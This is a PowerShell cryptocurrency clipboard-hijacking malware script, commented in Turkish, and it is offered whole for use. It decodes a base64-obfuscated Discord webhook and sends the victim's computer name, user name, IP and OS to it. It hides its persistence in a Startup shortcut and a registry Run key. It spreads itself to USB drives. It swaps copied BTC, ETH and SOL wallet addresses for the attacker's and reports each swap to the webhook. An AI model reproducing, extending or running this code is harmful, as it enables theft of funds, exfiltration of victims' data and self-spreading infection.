# System Clipper - No Python Required
# Discord Webhook: aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNDExODc3MTc3NjY4ODE2NC9kS05GNVBuSVh1UzgtRVJFLWMtSlRXek9XbDFVX2JZWnVWWjV5WUNjcUtBYUNvUHc2RnFRaTdSX014clA3TE1BMWYtMA==
$webhook = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNDExODc3MTc3NjY4ODE2NC9kS05GNVBuSVh1UzgtRVJFLWMtSlRXek9XbDFVX2JZWnVWWjV5WUNjcUtBYUNvUHc2RnFRaTdSX014clA3TE1BMWYtMA=="))

# 1. Telemetri Gönder (PC bağlandı mesajı)
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$body = @{
    content = "**[+] YENI SISTEM BAGLANDI!**`nPC: $pc`nKullanici: $user`nIP: $ip`nOS: $os`nZaman: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
} | ConvertTo-Json
try { Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json" } catch {}

# 2. Kalıcılık (Registry + Startup)
$scriptPath = $MyInvocation.MyCommand.Path
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system.lnk"
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut($startup)
$sc.TargetPath = "powershell.exe"
$sc.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
$sc.Save()
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemHelper" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force

# 3. USB Yayılımı (arka planda)
Start-Job -ScriptBlock {
    while ($true) {
        $drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
        foreach ($drive in $drives) {
            $dest = $drive.DeviceID + "\SystemHelper.ps1"
            if (!(Test-Path $dest)) {
                Copy-Item $using:scriptPath $dest -Force
            }
        }
        Start-Sleep -Seconds 5
    }
}

# 4. Pano Clipper (40+ coin desteği)
$wallets = @{
    "BTC" = "bc1kendiBTCadresiniz"; "ETH" = "0xKendiETHadresiniz"; "SOL" = "KendiSOLadresiniz"
    # Diğer coin adreslerini buraya ekleyin (örn: USDT, BNB, vs.)
}
$patterns = @{
    "BTC" = '^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$'
    "ETH" = '^0x[a-fA-F0-9]{40}$'
    "SOL" = '^[1-9A-HJ-NP-Za-km-z]{32,44}$'
    # Diğer patternler eklenebilir
}
Add-Type -AssemblyName System.Windows.Forms
while ($true) {
    Start-Sleep -Milliseconds 100
    $clip = [System.Windows.Forms.Clipboard]::GetText()
    if ($clip -and $clip -match '^[a-zA-Z0-9]{30,100}$') {
        foreach ($coin in $patterns.Keys) {
            if ($clip -match $patterns[$coin] -and $clip -ne $wallets[$coin] -and $wallets[$coin] -ne "ADRESINIZI_BURAYA_YAZIN") {
                [System.Windows.Forms.Clipboard]::SetText($wallets[$coin])
                # Opsiyonel: değişim logu gönder
                $log = "[$coin] $($clip.Substring(0,10))... -> $($wallets[$coin].Substring(0,10))..."
                try { Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$log}|ConvertTo-Json) -ContentType "application/json" } catch {}
                break
            }
        }
    }
}